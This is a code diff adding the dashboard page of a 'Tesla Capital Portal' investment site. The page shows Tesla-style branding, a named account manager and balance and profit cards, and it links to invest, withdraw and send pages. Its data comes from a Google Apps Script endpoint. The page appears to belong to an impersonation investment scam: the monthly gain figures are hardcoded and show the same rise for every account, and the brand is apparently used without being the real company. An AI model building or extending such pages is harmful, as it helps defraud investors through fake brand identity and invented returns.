@@ -1,1 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tesla Capital Portal - Dashboard</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #0d0d0d; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+    </style>
+</head>
+<body class="text-white min-h-screen pb-24">
 
+    <!-- Header Navigation -->
+    <header class="flex items-center justify-between px-6 py-4 border-b border-[#222] bg-[#141414] sticky top-0 z-50">
+        <div class="flex items-center space-x-2">
+            <svg class="w-8 h-8 text-[#E82127] fill-current" viewBox="0 0 24 24">
+                <path d="M12 2L2 4.5v2L12 9l10-2.5v-2L12 2zm0 8.5L3 8v6.5c0 3 4 5.5 9 6.5 5-1 9-3.5 9-6.5V8l-9 2.5z"/>
+            </svg>
+            <span class="font-semibold tracking-tight text-sm uppercase">Tesla Hub</span>
+        </div>
+        <div class="flex items-center space-x-4">
+            <div class="text-right">
+                <p class="text-xs text-[#888]">Account Manager</p>
+                <p class="text-xs font-medium text-emerald-400 flex items-center justify-end">
+                    <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 mr-1.5 animate-pulse"></span>Sarah Jenkins
+                </p>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content Grid -->
+    <main class="max-w-md mx-auto px-4 mt-6 space-y-6">
+        
+        <!-- Welcome Title -->
+        <div>
+            <h2 class="text-2xl font-bold tracking-tight">Welcome back, <span id="userName" class="text-neutral-300">Investor</span></h2>
+            <p class="text-xs text-[#888] mt-0.5">Track. Invest. Grow.</p>
+        </div>
+
+        <!-- Metric Balance Cards -->
+        <div class="space-y-4">
+            <!-- Total Balance Card -->
+            <div class="bg-[#141414] border border-[#222] rounded-2xl p-5 relative overflow-hidden">
+                <p class="text-xs font-medium uppercase tracking-wider text-[#888]">Total Balance</p>
+                <div class="flex items-baseline justify-between mt-2">
+                    <h3 id="totalBalance" class="text-3xl font-bold tracking-tight text-neutral-100">Fetching...</h3>
+                </div>
+                <p class="text-xs text-emerald-400 font-medium flex items-center mt-2">↑ 5.24% <span class="text-[#666] ml-1">vs last month</span></p>
+            </div>
+
+            <!-- Total Profit Card -->
+            <div class="bg-[#141414] border border-[#222] rounded-2xl p-5 relative overflow-hidden">
+                <p class="text-xs font-medium uppercase tracking-wider text-[#888]">Total Profit</p>
+                <div class="flex items-baseline justify-between mt-2">
+                    <h3 id="totalProfit" class="text-3xl font-bold tracking-tight text-neutral-100">Fetching...</h3>
+                </div>
+                <p class="text-xs text-emerald-400 font-medium flex items-center mt-2">↑ 8.45% <span class="text-[#666] ml-1">vs last month</span></p>
+            </div>
+        </div>
+
+        <!-- Action Grid Layout -->
+        <div class="grid grid-cols-3 gap-3">
+            <a href="invest.html" class="bg-[#141414] border border-[#222] rounded-xl p-4 flex flex-col items-center justify-center text-center transition-all active:scale-95">
+                <span class="text-lg mb-1">🏦</span><span class="text-xs font-medium tracking-wide">Invest</span>
+            </a>
+            <a href="withdraw.html" class="bg-[#141414] border border-[#222] rounded-xl p-4 flex flex-col items-center justify-center text-center transition-all active:scale-95">
+                <span class="text-lg mb-1">🏧</span><span class="text-xs font-medium tracking-wide">Withdraw</span>
+            </a>
+            <a href="send.html" class="bg-[#141414] border border-[#222] rounded-xl p-4 flex flex-col items-center justify-center text-center transition-all active:scale-95">
+                <span class="text-lg mb-1">🚀</span><span class="text-xs font-medium tracking-wide">Send</span>
+            </a>
+            <a href="buyshare.html" class="bg-[#141414] border border-[#222] rounded-xl p-4 flex flex-col items-center justify-center text-center transition-all active:scale-95">
+                <span class="text-lg mb-1">📈</span><span class="text-xs font-medium tracking-wide">Buy Share</span>
+            </a>
+            <a href="receive.html" class="bg-[#141414] border border-[#222] rounded-xl p-4 flex flex-col items-center justify-center text-center transition-all active:scale-95">
+                <span class="text-lg mb-1">📥</span><span class="text-xs font-medium tracking-wide">Receive</span>
+            </a>
+            <a href="bills.html" class="bg-[#141414] border border-[#222] rounded-xl p-4 flex flex-col items-center justify-center text-center transition-all active:scale-95">
+                <span class="text-lg mb-1">🧾</span><span class="text-xs font-medium tracking-wide">Bills</span>
+            </a>
+        </div>
+
+    </main>
+
+    <script>
+        const API_URL = "https://script.google.com/macros/s/AKfycbx7Gg2ClxC7VdaDReZzI4jV_q8RKBDYPteFN526vQjmsxWSmGDQyy-NLkDXhivOHSh0Yw/exec";
+
+        // Safeguard routing check
+        const userId = localStorage.getItem("userId");
+        const fullName = localStorage.getItem("fullName");
+
+        if (!userId) {
+            window.location.href = "index.html";
+        } else {
+            document.getElementById('userName').innerText = fullName || "Investor";
+            loadDashboardMetrics();
+        }
+
+        async function loadDashboardMetrics() {
+            try {
+                const response = await fetch(API_URL, {
+                    method: "POST",
+                    mode: "cors",
+                    headers: { "Content-Type": "text/plain" },
+                    body: JSON.stringify({
+                        action: "getDashboardData",
+                        userId: userId
+                    })
+                });
+
+                const result = await response.json();
+                
+                if (result.status === "success") {
+                    document.getElementById('totalBalance').innerText = result.account.balance;
+                    document.getElementById('totalProfit').innerText = result.account.profit;
+                } else {
+                    document.getElementById('totalBalance').innerText = "Error";
+                    document.getElementById('totalProfit').innerText = "Error";
+                }
+            } catch (err) {
+                document.getElementById('totalBalance').innerText = "Disconnected";
+                document.getElementById('totalProfit').innerText = "Disconnected";
+            }
+        }
+    </script>
+</body>
+</html>
